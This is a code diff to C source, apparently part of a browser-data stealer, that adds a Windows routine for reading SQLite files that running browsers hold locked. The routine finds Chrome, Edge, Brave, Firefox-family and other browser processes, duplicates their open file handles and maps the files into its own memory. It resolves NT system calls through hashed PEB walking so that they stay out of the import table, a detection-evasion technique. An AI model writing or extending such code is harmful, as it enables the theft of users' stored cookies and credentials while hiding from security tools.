@@ -15,6 +15,9 @@
 #include "config.h"
 #include "secure_zero.h"
 #include "cdp_grabber.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "peb.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -31,26 +34,282 @@
 #define PATH_SEP_CHAR '/'
 #endif
 
+/* ═══════════════════════════════════════════════════════════════ *
+ *  Locked-file bypass — section-mapping read from browser proc   *
+ *                                                                *
+ *  When Chrome holds an exclusive lock on a SQLite DB, fopen()   *
+ *  fails with ERROR_SHARING_VIOLATION.  This fallback:           *
+ *   1. Finds browser PIDs via NtGetNextProcess + image name      *
+ *   2. Enumerates system handles (class 16) for those PIDs       *
+ *   3. Duplicates matching file handles into our process         *
+ *   4. Creates a section + maps it to read the file contents     *
+ *                                                                *
+ *  All Nt* APIs resolved via PEB-walk hash — no IAT imports.     *
+ * ═══════════════════════════════════════════════════════════════ */
+#ifdef _WIN32
+
+/* NT API function types (resolved at runtime via PEB-walk) */
+typedef NTSTATUS (WINAPI *fnNtGetNextProcess)(HANDLE, ULONG, ULONG, ULONG, HANDLE *);
+typedef NTSTATUS (WINAPI *fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, ULONG *);
+typedef NTSTATUS (WINAPI *fnNtQSI)(ULONG, PVOID, ULONG, ULONG *);
+typedef NTSTATUS (WINAPI *fnNtOpenProc)(HANDLE *, ULONG, PVOID, PVOID);
+typedef NTSTATUS (WINAPI *fnNtClose)(HANDLE);
+typedef NTSTATUS (WINAPI *fnNtDupObj)(HANDLE, HANDLE, HANDLE *, HANDLE *, ULONG, ULONG, ULONG);
+typedef NTSTATUS (WINAPI *fnNtCreateSec)(HANDLE *, ULONG, PVOID, PVOID, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (WINAPI *fnNtMapView)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PVOID, SIZE_T *, ULONG, ULONG, ULONG);
+typedef NTSTATUS (WINAPI *fnNtUnmapView)(HANDLE, PVOID);
+
+/* SystemHandleInformation class (nt_query_system_information) */
+#define MIRAGE_SysHandleInfo  16
+#define MIRAGE_ProcImageName  27
+#define MIRAGE_ProcBasicInfo  0
+
+/* Handle table entry — mirrors SYSTEM_HANDLE_TABLE_ENTRY_INFO */
+typedef struct {
+    USHORT UniqueProcessId;
+    USHORT CreatorBackTraceIndex;
+    UCHAR  ObjectTypeIndex;
+    UCHAR  HandleAttributes;
+    USHORT HandleValue;
+    PVOID  Object;
+    ULONG  GrantedAccess;
+} MirHandleEntry;
+
+typedef struct {
+    ULONG          NumberOfHandles;
+    MirHandleEntry Handles[1];
+} MirHandleTable;
+
+/* ProcessBasicInformation — enough to extract PID */
+typedef struct {
+    NTSTATUS  ExitStatus;
+    PVOID     PebBaseAddress;
+    ULONG_PTR AffinityMask;
+    LONG      BasePriority;
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} MirPBI;
+
+typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } MirCLIENT_ID;
+
+/* Browser executable stems (lowercase, no .exe) */
+static const char * const g_browser_stems[] = {
+    "chrome", "msedge", "brave", "opera", "vivaldi",
+    "chromium", "slimjet", "yandex", "iron", "falkon",
+    "seamonkey", "waterfox", "palemoon", "basilisk",
+    NULL
+};
+
+/* Case-insensitive wide-vs-narrow stem match (no ext) */
+static int _mir_stem_eq(const WCHAR *w, int wlen, const char *t) {
+    for (int i = 0; i < wlen; i++) {
+        WCHAR wc = w[i];
+        char  tc = t[i];
+        if (wc >= L'A' && wc <= L'Z') wc += 32;
+        if (tc >= 'A'  && tc <= 'Z')  tc += 32;
+        if ((char)wc != tc) return 0;
+        if (tc == '\0') return 0;
+    }
+    return t[wlen] == '\0';
+}
+
+/* Resolve one ntdll export by name hash. Returns NULL on miss. */
+static void *_mir_res(void *ntdll, const char *name) {
+    return mirage_get_function_by_hash(
+        ntdll, mirage_encrypted_hash_func(name));
+}
+
+static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
+    unsigned char *result = NULL;
+
+    void *ntdll = mirage_get_module_by_hash(
+        mirage_encrypted_hash_module("ntdll.dll"));
+    if (!ntdll) return NULL;
+
+    /* Resolve NT functions */
+    fnNtGetNextProcess pGNP   = (fnNtGetNextProcess)_mir_res(ntdll, "NtGetNextProcess");
+    fnNtQIP            pQIP  = (fnNtQIP)           _mir_res(ntdll, "NtQueryInformationProcess");
+    fnNtQSI            pQSI  = (fnNtQSI)           _mir_res(ntdll, "NtQuerySystemInformation");
+    fnNtOpenProc       pOP   = (fnNtOpenProc)      _mir_res(ntdll, "NtOpenProcess");
+    fnNtClose          pCl   = (fnNtClose)         _mir_res(ntdll, "NtClose");
+    fnNtDupObj         pDup  = (fnNtDupObj)        _mir_res(ntdll, "NtDuplicateObject");
+    fnNtCreateSec      pCS   = (fnNtCreateSec)     _mir_res(ntdll, "NtCreateSection");
+    fnNtMapView        pMV   = (fnNtMapView)       _mir_res(ntdll, "NtMapViewOfSection");
+    fnNtUnmapView      pUV   = (fnNtUnmapView)     _mir_res(ntdll, "NtUnmapViewOfSection");
+    if (!pGNP||!pQIP||!pQSI||!pOP||!pCl||!pDup||!pCS||!pMV||!pUV)
+        return NULL;
+
+    /* Wide-char target path for comparison */
+    int wcap = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
+    if (wcap <= 0 || wcap > MAX_PATH) return NULL;
+    wchar_t *wtarget = (wchar_t *)malloc((size_t)wcap * sizeof(wchar_t));
+    if (!wtarget) return NULL;
+    MultiByteToWideChar(CP_UTF8, 0, path, -1, wtarget, wcap);
+
+    /* ── 1. Collect browser PIDs via NtGetNextProcess ──────── */
+    #define MAX_BPIDS 32
+    ULONG bpids[MAX_BPIDS];
+    int nbp = 0;
+    HANDLE ph = NULL;
+    for (;;) {
+        HANDLE nx = NULL;
+        NTSTATUS st = pGNP(ph, 0x0400 /*PROCESS_QUERY_INFORMATION*/, 0, 0, &nx);
+        if (ph) { pCl(ph); ph = NULL; }
+        if (st == STATUS_NO_MORE_ENTRIES) break;
+        if (st < 0) break;
+        ph = nx;
+
+        /* ProcessImageFileName → UNICODE_STRING */
+        UNICODE_STRING img = {0, 0, NULL};
+        st = pQIP(ph, MIRAGE_ProcImageName, &img, sizeof(UNICODE_STRING), NULL);
+        if (st < 0 || !img.Buffer || img.Length == 0) continue;
+
+        /* Extract stem (filename minus .exe) */
+        const WCHAR *name = img.Buffer;
+        int nlen = img.Length / (int)sizeof(WCHAR);
+        {   int ls = -1;
+            for (int j = 0; j < nlen; j++) if (img.Buffer[j] == L'\\') ls = j;
+            if (ls >= 0) { name = img.Buffer + ls + 1; nlen -= ls + 1; }
+        }
+        if (nlen <= 0) continue;
+        int stem = nlen;
+        if (stem > 4) {
+            const WCHAR *ext = name + stem - 4;
+            if (ext[0]==L'.' && (ext[1]==L'e'||ext[1]==L'E') &&
+                (ext[2]==L'x'||ext[2]==L'X') && (ext[3]==L'e'||ext[3]==L'E'))
+                stem -= 4;
+        }
+        int match = 0;
+        for (int s = 0; g_browser_stems[s]; s++)
+            if (_mir_stem_eq(name, stem, g_browser_stems[s])) { match = 1; break; }
+        if (!match) continue;
+
+        /* Extract PID */
+        MirPBI pbi = {0};
+        st = pQIP(ph, MIRAGE_ProcBasicInfo, &pbi, sizeof(pbi), NULL);
+        if (st >= 0 && nbp < MAX_BPIDS)
+            bpids[nbp++] = (ULONG)pbi.UniqueProcessId;
+    }
+    if (ph) pCl(ph);
+    if (nbp == 0) { free(wtarget); return NULL; }
+
+    /* ── 2. Enumerate system handles ─────────────────────── */
+    ULONG bufsz = 1 << 20;  /* 1 MiB initial */
+    MirHandleTable *ht = NULL;
+    for (;;) {
+        free(ht);
+        ht = (MirHandleTable *)malloc(bufsz);
+        if (!ht) { free(wtarget); return NULL; }
+        ULONG needed = 0;
+        NTSTATUS st = pQSI(MIRAGE_SysHandleInfo, ht, bufsz, &needed);
+        if (st >= 0) break;
+        if ((st == (NTSTATUS)0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) && needed > bufsz) {
+            bufsz = needed + 4096;
+            continue;
+        }
+        free(ht); free(wtarget); return NULL;
+    }
+
+    /* ── 3. Walk handles, find ours ───────────────────────── */
+    HANDLE hself = GetCurrentProcess();
+    for (ULONG i = 0; i < ht->NumberOfHandles && !result; i++) {
+        MirHandleEntry *e = &ht->Handles[i];
+
+        /* Owned by a browser process? */
+        int is_bp = 0;
+        for (int p = 0; p < nbp; p++)
+            if ((ULONG)e->UniqueProcessId == bpids[p]) { is_bp = 1; break; }
+        if (!is_bp) continue;
+
+        /* Needs file-like read access (FILE_READ_DATA|SYNCHRONIZE|READ_CONTROL) */
+        if (!(e->GrantedAccess & 0x00120001)) continue;
+
+        /* Open owner with PROCESS_DUP_HANDLE */
+        HANDLE hproc = NULL;
+        MirCLIENT_ID cid = { (HANDLE)(ULONG_PTR)e->UniqueProcessId, NULL };
+        OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
+        NTSTATUS st = pOP(&hproc, 0x0040, &oa, &cid);
+        if (st < 0 || !hproc) continue;
+
+        /* Duplicate into our process with read access */
+        HANDLE hdup = NULL;
+        st = pDup(hproc, (HANDLE)(ULONG_PTR)e->HandleValue,
+                  hself, &hdup, 0x00120081, 0, 0);
+        pCl(hproc);
+        if (st < 0 || !hdup) continue;
+
+        /* Match by canonical path */
+        wchar_t fpath[MAX_PATH + 4];
+        DWORD plen = GetFinalPathNameByHandleW(hdup, fpath, MAX_PATH, 0);
+        int matched = 0;
+        if (plen > 0 && plen < MAX_PATH) {
+            wchar_t *cmp = fpath;
+            if (cmp[0]==L'\\' && cmp[1]==L'\\' && cmp[2]==L'?' && cmp[3]==L'\\')
+                cmp += 4;
+            if (_wcsicmp(cmp, wtarget) == 0) matched = 1;
+        }
+
+        if (matched) {
+            /* Get exact file size (mapped pages are page-aligned) */
+            DWORD fsize = GetFileSize(hdup, NULL);
+            if (fsize != INVALID_FILE_SIZE && fsize > 0) {
+                HANDLE hsec = NULL;
+                st = pCS(&hsec, 0x0004 /*SECTION_MAP_READ*/,
+                         NULL, NULL, 0x02 /*PAGE_READONLY*/,
+                         0x08000000 /*SEC_COMMIT*/, hdup);
+                if (st >= 0 && hsec) {
+                    PVOID base = NULL;
+                    SIZE_T viewsz = 0;
+                    st = pMV(hsec, hself, &base, 0, 0, NULL, &viewsz,
+                             2 /*ViewShare*/, 0, 0x02 /*PAGE_READONLY*/);
+                    if (st >= 0 && base) {
+                        result = (unsigned char *)malloc(fsize);
+                        if (result) {
+                            memcpy(result, base, fsize);
+                            *out_len = fsize;
+                        }
+                        pUV(hself, base);
+                    }
+                    pCl(hsec);
+                }
+            }
+        }
+        CloseHandle(hdup);
+    }
+
+    free(ht);
+    free(wtarget);
+    return result;
+}
+
+#endif /* _WIN32 */
+
 /* ── Helper: read entire file into malloc'd buffer ───────────── */
 
 static unsigned char *read_file(const char *path, size_t *out_len) {
     FILE *f = fopen(path, "rb");
-    if (!f) return NULL;
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        long sz = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        if (sz <= 0) { fclose(f); return NULL; }
 
-    fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (sz <= 0) { fclose(f); return NULL; }
+        unsigned char *buf = (unsigned char *)malloc((size_t)sz);
+        if (!buf) { fclose(f); return NULL; }
 
-    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
-    if (!buf) { fclose(f); return NULL; }
+        size_t rd = fread(buf, 1, (size_t)sz, f);
+        fclose(f);
 
-    size_t rd = fread(buf, 1, (size_t)sz, f);
-    fclose(f);
+        if (rd == (size_t)sz) { *out_len = rd; return buf; }
+        free(buf);
+    }
 
-    if (rd != (size_t)sz) { free(buf); return NULL; }
-    *out_len = rd;
-    return buf;
+#ifdef _WIN32
+    /* fopen failed (sharing violation) — try section-mapping bypass */
+    return read_file_via_section(path, out_len);
+#else
+    return NULL;
+#endif
 }
 
 /* ── Helper: path join ───────────────────────────────────────── */
